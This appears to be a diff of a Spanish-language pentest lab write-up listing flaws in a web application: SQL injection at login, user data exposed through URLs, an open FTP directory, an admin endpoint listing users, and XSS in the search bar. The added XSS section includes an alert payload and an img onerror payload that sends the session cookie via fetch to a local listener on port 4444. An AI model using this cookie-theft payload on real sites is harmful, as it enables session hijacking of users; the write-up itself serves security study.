@@ -16,7 +16,7 @@ Para explotarlo en el Login ingresamos la siguiente sentencia SQL con una contra
 
 ## Exposición de datos del usuario
 
-No tiene sanizadas las entradas de las peticiones en las URLs, permietiendo ver indormación del usuario logueado:
+No tiene controlada las entradas de las peticiones en las URLs, permietiendo ver indormación del usuario logueado:
 
 ![image](https://github.com/user-attachments/assets/5be1bd34-dd4b-45f3-b834-62f3e32e1a13)
 
@@ -29,8 +29,24 @@ No tiene el directorio del servicio ftp oculto:
 
 ![image](https://github.com/user-attachments/assets/6b1fff73-7f81-4fff-8fe6-2aa5d91fe170)
 
-## 
+## Endpoint Administración
+
+Tiene un endpoint llamado administración donde podemos ver todos los usuarios registrados:
+
+![image](https://github.com/user-attachments/assets/9e187548-fe49-452c-91c9-64211f58dcc7)
 
 
+## Vulnerabilidad XSS
 
-![image](https://github.com/user-attachments/assets/4e2a01d0-c46d-4033-8af1-76316079e841)
+En la barra de búsqueda podemos insertar script xss:
+
+<img src="x" onerror="alert('XSS Funciona')">
+
+![image](https://github.com/user-attachments/assets/c9ab2e27-d567-481e-99e1-fb42c87066c4)
+
+Al ser vulnerable a XSS, he probado a levantarme un servidor python que escuche el puerto 4444, y en la web ejecuto un script que robe la cookie de sesion del usuario logueado, para que el servidor lo reciba:
+
+<img src="x" onerror="fetch('http://127.0.0.1:4444/steal?cookie=' + document.cookie)">
+
+![image](https://github.com/user-attachments/assets/4caa8e13-8fd9-4f3e-af67-48295d66314d)
+
